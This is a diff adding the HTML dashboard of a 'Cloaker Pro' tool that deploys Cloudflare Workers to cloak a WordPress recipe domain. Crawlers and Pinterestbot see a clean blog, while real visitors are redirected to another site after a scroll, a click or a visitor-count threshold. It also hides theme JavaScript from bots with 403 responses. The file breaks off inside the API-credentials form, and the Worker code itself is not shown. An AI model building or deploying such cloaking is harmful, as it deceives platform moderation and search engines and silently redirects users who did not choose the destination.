@@ -1,0 +1,1315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cloudflare Cloaker Automation Pro</title>
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Plus Jakarta Sans & JetBrains Mono Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <!-- Lucide Icons -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['"Plus Jakarta Sans"', 'sans-serif'],
+            mono: ['"JetBrains Mono"', 'monospace'],
+          },
+          colors: {
+            brand: {
+              50: '#ecfdf5',
+              100: '#d1fae5',
+              500: '#10b981',
+              600: '#059669',
+              700: '#047857',
+            },
+            cf: {
+              50: '#fff7ed',
+              500: '#f97316',
+              600: '#ea580c',
+            }
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    body {
+      background-color: #f8fafc;
+      background-image: 
+        radial-gradient(at 0% 0%, rgba(16, 185, 129, 0.05) 0px, transparent 40%),
+        radial-gradient(at 100% 0%, rgba(249, 115, 22, 0.04) 0px, transparent 40%);
+    }
+    .master-card.active {
+      border-color: #10b981;
+      background-color: #f0fdf4;
+      box-shadow: 0 4px 14px -2px rgba(16, 185, 129, 0.15);
+    }
+    .master-card {
+      transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+    .master-card:hover:not(.active) {
+      border-color: #cbd5e1;
+      background-color: #f8fafc;
+      transform: translateY(-1px);
+    }
+    .trigger-card.active {
+      border-color: #10b981;
+      background-color: #ffffff;
+      box-shadow: 0 2px 8px -2px rgba(16, 185, 129, 0.2);
+    }
+    .trigger-card {
+      transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+    .code-scroll::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    .code-scroll::-webkit-scrollbar-thumb {
+      background: #475569;
+      border-radius: 4px;
+    }
+    .code-scroll::-webkit-scrollbar-track {
+      background: #0f172a;
+    }
+  </style>
+</head>
+<body class="text-slate-800 antialiased min-h-screen flex flex-col font-sans">
+
+  <!-- Top Navigation Bar -->
+  <header class="bg-white border-b border-slate-200/80 sticky top-0 z-40 shadow-[0_1px_3px_rgba(0,0,0,0.03)]">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+      
+      <!-- Brand & Title -->
+      <div class="flex items-center space-x-3">
+        <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-emerald-500 to-teal-500 flex items-center justify-center shadow-md shadow-emerald-500/20 text-white font-black text-xl">
+          <i data-lucide="shield-check" class="w-6 h-6"></i>
+        </div>
+        <div>
+          <div class="flex items-center gap-2">
+            <span class="text-base font-bold text-slate-900 tracking-tight">Cloaker Pro</span>
+            <span class="px-2 py-0.5 text-[11px] font-semibold rounded-full bg-emerald-100 text-emerald-800 border border-emerald-200">CF Automation</span>
+          </div>
+          <p class="text-xs text-slate-500">Choose ONE method: Human Trigger Condition OR 24h Unique Visitor Gate</p>
+        </div>
+      </div>
+
+      <!-- Right Header Actions -->
+      <div class="flex items-center space-x-3">
+        <!-- Cloudflare Connection Status Pill -->
+        <div id="cf-status-pill" onclick="testCfConnection(true)" class="cursor-pointer flex items-center space-x-2 px-3 py-1.5 rounded-full bg-slate-100 border border-slate-200 text-xs font-medium text-slate-700 hover:bg-slate-200 transition" title="Click to test / refresh Cloudflare connection">
+          <span id="cf-dot" class="w-2 h-2 rounded-full bg-amber-400 animate-pulse"></span>
+          <span id="cf-status-text">Connecting Cloudflare...</span>
+        </div>
+
+        <!-- Settings Button -->
+        <button onclick="openSettingsModal()" class="flex items-center space-x-1.5 px-3 py-1.5 rounded-lg border border-slate-200 hover:border-slate-300 hover:bg-slate-50 text-xs font-semibold text-slate-700 transition">
+          <i data-lucide="settings" class="w-3.5 h-3.5 text-slate-500"></i>
+          <span>API Credentials</span>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Workspace -->
+  <main class="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8">
+
+    <!-- 2-Column Workboard -->
+    <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
+      
+      <!-- LEFT COLUMN: Campaign Builder Form (7 Cols) -->
+      <div class="lg:col-span-7 space-y-6">
+        
+        <!-- STEP 1: Traffic Routing Card -->
+        <div class="bg-white rounded-2xl border border-slate-200/90 p-6 shadow-sm space-y-5">
+          <div class="flex items-center justify-between border-b border-slate-100 pb-3">
+            <div class="flex items-center space-x-2.5">
+              <span class="w-6 h-6 rounded-full bg-emerald-600 text-white font-bold text-xs flex items-center justify-center">1</span>
+              <h3 class="text-sm font-bold text-slate-900">Source Domain & Target Destination</h3>
+            </div>
+            <span class="text-xs text-slate-500 font-medium">Cloudflare Zone Bound</span>
+          </div>
+
+          <div class="space-y-4">
+            <!-- Source Domain -->
+            <div>
+              <div class="flex items-center justify-between mb-1.5">
+                <label class="text-xs font-semibold text-slate-700 flex items-center gap-1.5">
+                  <i data-lucide="globe" class="w-3.5 h-3.5 text-emerald-600"></i>
+                  Source Domain (Origin WordPress)
+                </label>
+                <!-- Quick Zone Selector Dropdown -->
+                <select id="zoneSelect" onchange="selectZone(this.value)" class="text-xs bg-slate-50 border border-slate-200 rounded-lg px-2.5 py-1 text-slate-700 focus:outline-none focus:ring-1 focus:ring-emerald-500 hidden">
+                  <option value="">Choose Cloudflare Zone...</option>
+                </select>
+              </div>
+              <div class="relative">
+                <input 
+                  type="text" 
+                  id="sourceDomain" 
+                  placeholder="e.g. homeandrecipe.com" 
+                  value="homeandrecipe.com"
+                  oninput="updateWorkerName(); generatePreview();"
+                  class="w-full bg-slate-50/70 border border-slate-200 rounded-xl px-3.5 py-2.5 text-sm text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 font-medium transition"
+                />
+              </div>
+              <p class="text-[11px] text-slate-500 mt-1">Routes will be bound to: <span id="preview-routes" class="font-mono text-emerald-600 font-semibold">homeandrecipe.com/*</span> and <span id="preview-routes-www" class="font-mono text-emerald-600 font-semibold">www.homeandrecipe.com/*</span></p>
+            </div>
+
+            <!-- Target Domain -->
+            <div>
+              <label class="text-xs font-semibold text-slate-700 flex items-center gap-1.5 mb-1.5">
+                <i data-lucide="corner-down-right" class="w-3.5 h-3.5 text-orange-500"></i>
+                Target Redirect URL (Where Real Humans Go)
+              </label>
+              <input 
+                type="text" 
+                id="targetDomain" 
+                placeholder="https://asqstyle.com" 
+                value="https://asqstyle.com"
+                oninput="generatePreview();"
+                class="w-full bg-slate-50/70 border border-slate-200 rounded-xl px-3.5 py-2.5 text-sm text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 font-medium transition"
+              />
+              <p class="text-[11px] text-slate-500 mt-1">Path and query strings (e.g. /post-name/?utm=...) are dynamically preserved on redirect.</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- STEP 2: CHOOSE ONE ACTIVATION METHOD -->
+        <div class="bg-white rounded-2xl border border-slate-200/90 p-6 shadow-sm space-y-5">
+          <div class="flex items-center justify-between border-b border-slate-100 pb-3">
+            <div class="flex items-center space-x-2.5">
+              <span class="w-6 h-6 rounded-full bg-emerald-600 text-white font-bold text-xs flex items-center justify-center">2</span>
+              <div>
+                <h3 class="text-sm font-bold text-slate-900">Activation Strategy (Select ONE Method)</h3>
+                <p class="text-[11px] text-slate-500">Choose ONE method: Human Interaction Trigger OR 24-Hour Unique Visitor Gate</p>
+              </div>
+            </div>
+            <span class="px-2 py-0.5 text-[10px] font-bold rounded-full bg-slate-100 text-slate-700 border border-slate-200">1 Method Active</span>
+          </div>
+
+          <!-- 2 MASTER SELECTION CARDS (MUTUALLY EXCLUSIVE) -->
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            
+            <!-- MASTER OPTION 1: Human Verification Trigger Condition -->
+            <div 
+              id="masterCardTrigger" 
+              onclick="selectMasterMethod('trigger')" 
+              class="master-card active p-4 rounded-xl border-2 border-emerald-500 bg-emerald-50/30 cursor-pointer relative"
+            >
+              <div class="flex items-center justify-between mb-2">
+                <span class="w-8 h-8 rounded-lg bg-emerald-100 text-emerald-700 flex items-center justify-center">
+                  <i data-lucide="zap" class="w-4 h-4"></i>
+                </span>
+                <span id="badgeMethodTrigger" class="px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-100 text-emerald-800 border border-emerald-200 uppercase tracking-wide">Active</span>
+              </div>
+              <h4 class="text-xs font-bold text-slate-900">Human Verification Trigger Condition</h4>
+              <p class="text-[11px] text-slate-600 mt-1 leading-snug">Redirects genuine humans immediately on physical interaction (Scroll, Click, or Both). Zero traffic waiting.</p>
+            </div>
+
+            <!-- MASTER OPTION 2: Unique Human Visitor Engine -->
+            <div 
+              id="masterCardThreshold" 
+              onclick="selectMasterMethod('visitor_threshold')" 
+              class="master-card p-4 rounded-xl border-2 border-slate-200 bg-white hover:border-slate-300 cursor-pointer relative"
+            >
+              <div class="flex items-center justify-between mb-2">
+                <span class="w-8 h-8 rounded-lg bg-indigo-100 text-indigo-700 flex items-center justify-center">
+                  <i data-lucide="users" class="w-4 h-4"></i>
+                </span>
+                <span id="badgeMethodThreshold" class="px-2 py-0.5 rounded-full text-[10px] font-bold bg-slate-100 text-slate-500 border border-slate-200 uppercase tracking-wide">Inactive</span>
+              </div>
+              <h4 class="text-xs font-bold text-slate-900">Unique Human Visitor (24h Gate)</h4>
+              <p class="text-[11px] text-slate-600 mt-1 leading-snug">Redirects only after the article URL reaches 50 unique human visitors in 24 hours. Auto-resets every 24h.</p>
+            </div>
+          </div>
+
+          <!-- ============================================================== -->
+          <!-- PANEL 1: SUB-OPTIONS FOR METHOD 1 (Human Verification Trigger) -->
+          <!-- ============================================================== -->
+          <div id="panelTriggerOptions" class="space-y-4 pt-2">
+            <div class="text-xs font-semibold text-slate-700 flex items-center gap-1">
+              <i data-lucide="mouse-pointer" class="w-3.5 h-3.5 text-emerald-600"></i>
+              <span>Select Human Trigger Action:</span>
+            </div>
+
+            <!-- 3 Trigger Sub-Cards -->
+            <div class="grid grid-cols-1 sm:grid-cols-3 gap-3">
+              <!-- Trigger: Both -->
+              <div 
+                id="cardTriggerBoth"
+                onclick="selectTrigger('both')" 
+                class="trigger-card active p-3.5 rounded-xl border-2 border-emerald-500 bg-white cursor-pointer relative"
+              >
+                <div class="flex items-center justify-between mb-1.5">
+                  <span class="w-6 h-6 rounded-lg bg-emerald-100 text-emerald-600 flex items-center justify-center">
+                    <i data-lucide="zap" class="w-3.5 h-3.5"></i>
+                  </span>
+                  <span class="px-1.5 py-0.2 rounded text-[9px] font-bold bg-emerald-100 text-emerald-800 uppercase">Fastest</span>
+                </div>
+                <h5 class="text-xs font-bold text-slate-900">Scroll OR Click</h5>
+                <p class="text-[10px] text-slate-500 mt-0.5 leading-tight">Redirects on whichever action happens first.</p>
+              </div>
+
+              <!-- Trigger: Scroll Only -->
+              <div 
+                id="cardTriggerScroll"
+                onclick="selectTrigger('scroll')" 
+                class="trigger-card p-3.5 rounded-xl border-2 border-slate-200 bg-white cursor-pointer relative"
+              >
+                <div class="flex items-center justify-between mb-1.5">
+                  <span class="w-6 h-6 rounded-lg bg-sky-100 text-sky-600 flex items-center justify-center">
+                    <i data-lucide="mouse" class="w-3.5 h-3.5"></i>
+                  </span>
+                  <span class="text-[9px] font-medium text-slate-400">Scroll</span>
+                </div>
+                <h5 class="text-xs font-bold text-slate-900">Scroll Only</h5>
+                <p class="text-[10px] text-slate-500 mt-0.5 leading-tight">Redirects when visitor scrolls past threshold.</p>
+              </div>
+
+              <!-- Trigger: Click Only -->
+              <div 
+                id="cardTriggerClick"
+                onclick="selectTrigger('click')" 
+                class="trigger-card p-3.5 rounded-xl border-2 border-slate-200 bg-white cursor-pointer relative"
+              >
+                <div class="flex items-center justify-between mb-1.5">
+                  <span class="w-6 h-6 rounded-lg bg-purple-100 text-purple-600 flex items-center justify-center">
+                    <i data-lucide="pointer" class="w-3.5 h-3.5"></i>
+                  </span>
+                  <span class="text-[9px] font-medium text-slate-400">Tap / Click</span>
+                </div>
+                <h5 class="text-xs font-bold text-slate-900">Click Only</h5>
+                <p class="text-[10px] text-slate-500 mt-0.5 leading-tight">Redirects on the first genuine tap or click.</p>
+              </div>
+            </div>
+
+            <!-- Scroll Slider (Visible for both & scroll) -->
+            <div id="scrollContainer" class="p-3.5 rounded-xl bg-slate-50/80 border border-slate-200/80 space-y-2.5 transition">
+              <div class="flex items-center justify-between">
+                <label class="text-xs font-semibold text-slate-700 flex items-center gap-1.5">
+                  <i data-lucide="sliders" class="w-3.5 h-3.5 text-emerald-600"></i>
+                  Scroll Distance Threshold
+                </label>
+                <span id="scrollValue" class="text-xs font-mono font-bold px-2 py-0.5 rounded bg-emerald-100 text-emerald-800 border border-emerald-200">15% Scroll</span>
+              </div>
+
+              <input 
+                type="range" 
+                id="scrollRange" 
+                min="5" 
+                max="50" 
+                value="15" 
+                oninput="updateScrollVal(this.value); generatePreview();"
+                class="w-full h-2 bg-slate-200 rounded-lg appearance-none cursor-pointer accent-emerald-600"
+              />
+
+              <div class="flex items-center justify-between text-xs text-slate-500 pt-0.5">
+                <span>Presets:</span>
+                <div class="flex gap-1.5">
+                  <button onclick="setScrollVal(10)" class="px-2 py-0.5 rounded bg-white hover:bg-slate-100 border border-slate-200 text-[11px] font-medium text-slate-700 transition">10%</button>
+                  <button onclick="setScrollVal(15)" class="px-2 py-0.5 rounded bg-white hover:bg-slate-100 border border-slate-200 text-[11px] font-medium text-slate-700 transition">15% (Rec)</button>
+                  <button onclick="setScrollVal(20)" class="px-2 py-0.5 rounded bg-white hover:bg-slate-100 border border-slate-200 text-[11px] font-medium text-slate-700 transition">20%</button>
+                  <button onclick="setScrollVal(30)" class="px-2 py-0.5 rounded bg-white hover:bg-slate-100 border border-slate-200 text-[11px] font-medium text-slate-700 transition">30%</button>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- ============================================================== -->
+          <!-- PANEL 2: SUB-OPTIONS FOR METHOD 2 (Unique Human Visitor Gate)  -->
+          <!-- ============================================================== -->
+          <div id="panelThresholdOptions" class="space-y-4 pt-2 hidden">
+            <div class="p-4 rounded-xl bg-indigo-50/60 border border-indigo-100 space-y-3">
+              <div class="flex items-center justify-between">
+                <div>
+                  <label class="text-xs font-bold text-indigo-900 flex items-center gap-1.5">
+                    <i data-lucide="users" class="w-3.5 h-3.5 text-indigo-600"></i>
+                    Minimum Unique Humans in 24 Hours
+                  </label>
+                  <p id="thresholdExplainer" class="text-[11px] text-indigo-700 mt-0.5">Visits 1 to 7 see clean blog post. Redirection activates from visitor #8 onward.</p>
+                </div>
+                <div class="flex items-center gap-1.5">
+                  <input 
+                    type="number" 
+                    id="thresholdCount" 
+                    value="8" 
+                    min="1" 
+                    max="10000"
+                    oninput="updateThresholdExplainer(); generatePreview(); loadAnalytics();"
+                    class="w-24 bg-white border border-indigo-200 rounded-xl px-3 py-1.5 text-sm text-slate-900 font-bold focus:outline-none focus:ring-2 focus:ring-indigo-500/20 text-center"
+                  />
+                  <span class="text-xs font-semibold text-indigo-900">/ 24h</span>
+                </div>
+              </div>
+
+              <!-- Reset Cycle Notice -->
+              <div class="flex items-center gap-2 pt-1 border-t border-indigo-100/80 text-[11px] text-indigo-800">
+                <i data-lucide="refresh-cw" class="w-3.5 h-3.5 text-indigo-600 shrink-0"></i>
+                <span><strong>Rolling 24-Hour Reset Active:</strong> Visits older than 24 hours expire automatically. Crawlers & Pinterestbot are strictly excluded.</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- STEP 3: Protection & Sitemaps Options -->
+        <div class="bg-white rounded-2xl border border-slate-200/90 p-6 shadow-sm space-y-4">
+          <div class="flex items-center justify-between border-b border-slate-100 pb-3">
+            <div class="flex items-center space-x-2.5">
+              <span class="w-6 h-6 rounded-full bg-emerald-600 text-white font-bold text-xs flex items-center justify-center">3</span>
+              <h3 class="text-sm font-bold text-slate-900">Security Rules & Sitemaps</h3>
+            </div>
+            <span class="text-xs text-emerald-600 font-semibold flex items-center gap-1">
+              <i data-lucide="check-circle" class="w-3.5 h-3.5"></i> Safe Defaults
+            </span>
+          </div>
+
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <!-- Block Themes Checkbox -->
+            <label class="flex items-start gap-3 p-3 rounded-xl border border-slate-200 hover:bg-slate-50/70 cursor-pointer transition">
+              <input type="checkbox" id="chkTheme" checked onchange="generatePreview();" class="mt-0.5 w-4 h-4 text-emerald-600 rounded border-slate-300 focus:ring-emerald-500 accent-emerald-600" />
+              <div>
+                <span class="text-xs font-bold text-slate-900 block">Protect /themes/ Directory</span>
+                <span class="text-[11px] text-slate-500 leading-tight block mt-0.5">Returns 403 Forbidden to bots; hides JS files from crawlers</span>
+              </div>
+            </label>
+
+            <!-- Auto-bind WWW -->
+            <label class="flex items-start gap-3 p-3 rounded-xl border border-slate-200 hover:bg-slate-50/70 cursor-pointer transition">
+              <input type="checkbox" id="chkIncludeWww" checked class="mt-0.5 w-4 h-4 text-emerald-600 rounded border-slate-300 focus:ring-emerald-500 accent-emerald-600" />
+              <div>
+                <span class="text-xs font-bold text-slate-900 block">Dual Domain Routes</span>
+                <span class="text-[11px] text-slate-500 leading-tight block mt-0.5">Automatically binds both domain.com/* and www.domain.com/*</span>
+              </div>
+            </label>
+          </div>
+
+          <!-- Sitemaps List Input -->
+          <div>
+            <label class="text-xs font-semibold text-slate-700 flex items-center gap-1.5 mb-1.5">
+              <i data-lucide="file-text" class="w-3.5 h-3.5 text-slate-500"></i>
+              Sitemap URLs for robots.txt (comma separated)
+            </label>
+            <input 
+              type="text" 
+              id="sitemapList" 
+              placeholder="wp-sitemap.xml, sitemap.xml" 
+              value="https://homeandrecipe.com/wp-sitemap.xml, https://homeandrecipe.com/sitemap.xml"
+              oninput="generatePreview();"
+              class="w-full bg-slate-50/70 border border-slate-200 rounded-xl px-3 py-2 text-xs text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 font-mono transition"
+            />
+          </div>
+
+          <!-- Hidden / Custom Worker Name -->
+          <input type="hidden" id="workerName" value="homeandrecipe-cloaker" />
+
+          <!-- Big 1-Click Action Deploy Button -->
+          <div class="pt-2">
+            <button 
+              id="btnDeploy"
+              onclick="startDeployment()" 
+              class="w-full py-3.5 px-6 rounded-xl bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-bold text-sm shadow-md shadow-emerald-600/20 flex items-center justify-center space-x-2 transition transform active:scale-[0.99]"
+            >
+              <i data-lucide="cloud-lightning" class="w-5 h-5"></i>
+              <span id="btnDeployText">Deploy 1-Click to Cloudflare</span>
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- RIGHT COLUMN: Live Previews, Terminal & History (5 Cols) -->
+      <div class="lg:col-span-5 space-y-6">
+        
+        <!-- Live Code Viewer & Terminal Box -->
+        <div class="bg-white rounded-2xl border border-slate-200/90 shadow-sm overflow-hidden flex flex-col">
+          
+          <!-- Top Tabs Navigation -->
+          <div class="flex items-center justify-between px-4 py-3 border-b border-slate-200 bg-slate-50/70">
+            <div class="flex items-center space-x-2">
+              <button id="tabBtnWorker" onclick="switchTab('worker')" class="px-3 py-1 text-xs font-bold rounded-lg bg-emerald-100 text-emerald-800 border border-emerald-200 transition">Worker Code</button>
+              <button id="tabBtnRobots" onclick="switchTab('robots')" class="px-3 py-1 text-xs font-bold rounded-lg text-slate-600 hover:text-slate-900 hover:bg-slate-100 transition">robots.txt</button>
+            </div>
+            
+            <div class="flex items-center space-x-2">
+              <button onclick="copyActiveCode()" class="flex items-center space-x-1 px-2.5 py-1 text-xs font-semibold rounded-lg bg-white border border-slate-200 hover:bg-slate-50 text-slate-700 transition">
+                <i data-lucide="copy" class="w-3.5 h-3.5 text-slate-500"></i>
+                <span id="copyBtnText">Copy</span>
+              </button>
+            </div>
+          </div>
+
+          <!-- Code Display Body -->
+          <div class="relative bg-slate-900 text-slate-100 p-4 font-mono text-xs leading-relaxed overflow-x-auto code-scroll h-72">
+            <pre id="tabWorker" class="m-0"><code id="codePreview">// Generating Worker code preview...</code></pre>
+            <pre id="tabRobots" class="m-0 hidden"><code id="robotsPreview"># Generating robots.txt...</code></pre>
+          </div>
+
+          <!-- Live Deployment Terminal Log Container -->
+          <div class="border-t border-slate-200 bg-slate-950 p-4 font-mono text-[11px] text-slate-300">
+            <div class="flex items-center justify-between mb-2">
+              <div class="flex items-center gap-1.5 text-xs text-slate-400 font-semibold">
+                <i data-lucide="terminal" class="w-3.5 h-3.5 text-emerald-400"></i>
+                <span>Cloudflare Deployment Log</span>
+              </div>
+              <span id="deployBadge" class="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-800 text-slate-400">Idle</span>
+            </div>
+            <div id="terminalConsole" class="h-28 overflow-y-auto code-scroll space-y-1 text-slate-400">
+              <div class="text-slate-500">> Ready for deployment. Click "Deploy 1-Click to Cloudflare" above.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Active Campaigns Table / Manager -->
+        <div class="bg-white rounded-2xl border border-slate-200/90 p-5 shadow-sm space-y-4">
+          <div class="flex items-center justify-between border-b border-slate-100 pb-3">
+            <div class="flex items-center space-x-2">
+              <i data-lucide="layers" class="w-4 h-4 text-emerald-600"></i>
+              <h3 class="text-xs font-bold text-slate-900 uppercase tracking-wider">Active Campaigns</h3>
+            </div>
+            <button onclick="loadCampaigns()" class="text-xs text-slate-500 hover:text-slate-800 flex items-center gap-1">
+              <i data-lucide="refresh-cw" class="w-3 h-3"></i> Sync
+            </button>
+          </div>
+
+          <div id="campaignsContainer" class="space-y-2">
+            <!-- Dynamically populated campaign items -->
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- FULL WIDTH: Real-Time 24-Hour Traffic & Post Analytics Section -->
+    <div class="bg-white rounded-2xl border border-slate-200/90 p-6 shadow-sm space-y-6">
+      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-100 pb-4">
+        <div>
+          <div class="flex items-center gap-2">
+            <div class="w-8 h-8 rounded-lg bg-indigo-100 text-indigo-700 flex items-center justify-center font-bold">
+              <i data-lucide="bar-chart-3" class="w-4 h-4"></i>
+            </div>
+            <h2 class="text-base font-bold text-slate-900">Real-Time 24-Hour Traffic Analytics</h2>
+            <span class="px-2 py-0.5 text-[11px] font-bold rounded-full bg-indigo-100 text-indigo-800 border border-indigo-200">Cloudflare D1 SQL</span>
+            <span id="syncTimestamp" class="text-[11px] font-mono text-emerald-700 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full font-semibold">Live Sync Active</span>
+          </div>
+          <p class="text-xs text-slate-500 mt-1">Live per-article visitor counters • Continuous rolling 24-hour reset • Zero crawlers counted</p>
+        </div>
+
+        <!-- Action Controls -->
+        <div class="flex items-center gap-2">
+          <button onclick="simulateTraffic(50)" class="px-3 py-1.5 rounded-xl border border-emerald-200 bg-emerald-50 hover:bg-emerald-100 text-emerald-800 text-xs font-semibold transition flex items-center gap-1.5">
+            <i data-lucide="user-plus" class="w-3.5 h-3.5 text-emerald-600"></i>
+            <span>Simulate 50 Humans (Test 24h Gate)</span>
+          </button>
+          <button onclick="resetAnalyticsData()" class="px-3 py-1.5 rounded-xl border border-slate-200 bg-slate-50 hover:bg-slate-100 text-slate-700 text-xs font-semibold transition flex items-center gap-1.5">
+            <i data-lucide="trash-2" class="w-3.5 h-3.5 text-slate-500"></i>
+            <span>Reset Counts</span>
+          </button>
+          <button id="btnSyncStats" onclick="manualSyncStats()" class="px-3 py-1.5 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-semibold transition flex items-center gap-1.5 shadow-sm shadow-indigo-600/20">
+            <i id="syncIcon" data-lucide="refresh-cw" class="w-3.5 h-3.5"></i>
+            <span>Sync Stats</span>
+          </button>
+        </div>
+      </div>
+
+      <!-- KPI Summary Cards -->
+      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+        <!-- KPI 1: Total 24h Unique Humans -->
+        <div class="p-4 rounded-xl border border-slate-200 bg-slate-50/50 space-y-1">
+          <div class="flex items-center justify-between text-xs text-slate-500">
+            <span>Total 24h Unique Humans</span>
+            <span class="flex items-center gap-1 text-[10px] text-emerald-600 font-bold bg-emerald-50 px-2 py-0.5 rounded-full border border-emerald-200">
+              <span class="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span> DB Synced
+            </span>
+          </div>
+          <div id="statTotalHumans" class="text-2xl font-black text-slate-900 font-mono">0</div>
+          <p id="statTotalVisitsSub" class="text-[10px] text-slate-500">Exact distinct fingerprints in D1</p>
+        </div>
+
+        <!-- KPI 2: Active Redirecting Posts -->
+        <div class="p-4 rounded-xl border border-emerald-200 bg-emerald-50/40 space-y-1">
+          <div class="flex items-center justify-between text-xs text-emerald-800 font-semibold">
+            <span>Active Redirecting Posts</span>
+            <i data-lucide="zap" class="w-4 h-4 text-emerald-600"></i>
+          </div>
+          <div id="statActivePosts" class="text-2xl font-black text-emerald-700 font-mono">0</div>
+          <p class="text-[10px] text-emerald-600">≥ <span id="kpiActiveThreshold">8</span> unique human visits in 24h</p>
+        </div>
+
+        <!-- KPI 3: Holding Posts -->
+        <div class="p-4 rounded-xl border border-amber-200 bg-amber-50/40 space-y-1">
+          <div class="flex items-center justify-between text-xs text-amber-800 font-semibold">
+            <span>Holding (Clean Blog)</span>
+            <i data-lucide="shield" class="w-4 h-4 text-amber-600"></i>
+          </div>
+          <div id="statHoldingPosts" class="text-2xl font-black text-amber-700 font-mono">0</div>
+          <p class="text-[10px] text-amber-600">&lt; <span id="kpiHoldingThreshold">8</span> human visits (Clean Origin)</p>
+        </div>
+
+        <!-- KPI 4: 24h Reset Cycle -->
+        <div class="p-4 rounded-xl border border-slate-200 bg-slate-50/50 space-y-1">
+          <div class="flex items-center justify-between text-xs text-slate-500">
+            <span>24h Reset Engine</span>
+            <i data-lucide="history" class="w-4 h-4 text-indigo-600"></i>
+          </div>
+          <div class="text-sm font-bold text-slate-800 flex items-center gap-1.5 pt-1">
+            <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+            <span>Rolling 24h Active</span>
+          </div>
+          <p class="text-[10px] text-slate-500">Stale visits auto-expire continuous</p>
+        </div>
+      </div>
+
+      <!-- Live Post Analytics Table -->
+      <div class="border border-slate-200 rounded-xl overflow-hidden">
+        <div class="overflow-x-auto">
+          <table class="w-full text-left text-xs">
+            <thead class="bg-slate-50/80 border-b border-slate-200 text-slate-600 font-semibold">
+              <tr>
+                <th class="px-4 py-3">Article / Post Path</th>
+                <th class="px-4 py-3">24-Hour Unique Humans</th>
+                <th class="px-4 py-3">Threshold Progress</th>
+                <th class="px-4 py-3">Status</th>
+                <th class="px-4 py-3">Last Visit</th>
+                <th class="px-4 py-3 text-right">Actions</th>
+              </tr>
+            </thead>
+            <tbody id="analyticsTableBody" class="divide-y divide-slate-100 text-slate-800">
+              <tr>
+                <td colspan="6" class="px-4 py-8 text-center text-slate-500">
+                  <div class="flex flex-col items-center justify-center space-y-2">
+                    <i data-lucide="inbox" class="w-6 h-6 text-slate-400"></i>
+                    <span>No human visits recorded in the last 24 hours yet.</span>
+                    <button onclick="simulateTraffic(1)" class="text-xs text-indigo-600 font-semibold hover:underline">
+                      + Simulate 1 human visit to test
+                    </button>
+                  </div>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Settings / API Modal -->
+  <div id="settingsModal" class="fixed inset-0 z-50 bg-slate-900/40 backdrop-blur-sm flex items-center justify-center p-4 hidden">
+    <div class="bg-white rounded-2xl border border-slate-200 shadow-xl max-w-md w-full p-6 space-y-5">
+      <div class="flex items-center justify-between border-b border-slate-100 pb-3">
+        <h3 class="text-sm font-bold text-slate-900 flex items-center gap-2">
+          <i data-lucide="key" class="w-4 h-4 text-emerald-600"></i>
+          Cloudflare API Credentials
+        </h3>
+        <button onclick="closeSettingsModal()" class="text-slate-400 hover:text-slate-600">
+          <i data-lucide="x" class="w-4 h-4"></i>
+        </button>
+      </div>
+
+      <div class="space-y-4 text-xs">
+        <div>
+          <label class="block font-semibold text-slate-700 mb-1">Cloudflare API Token</label>
+          <input 
+            type="password" 
+            id="cfgApiToken" 
+            placeholder="cfoat_..." 
+            class="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-slate-900 font-mono text-xs focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 focus:outline-none"
+          />
+        </div>
+
+        <div>
+          <label class="block font-semibold text-slate-700 mb-1">Cloudflare Account ID</label>
+          <input 
+            type="text" 
+            id="cfgAccountId" 
+            placeholder="7dc0e6c5b46881fec4f36bad5ac438a4" 
+            class="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-slate-900 font-mono text-xs focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 focus:outline-none"
+          />
+        </div>
+
+        <div>
+          <label class="block font-semibold text-slate-700 mb-1">Cloudflare D1 Database ID</label>
+          <input 
+            type="text" 
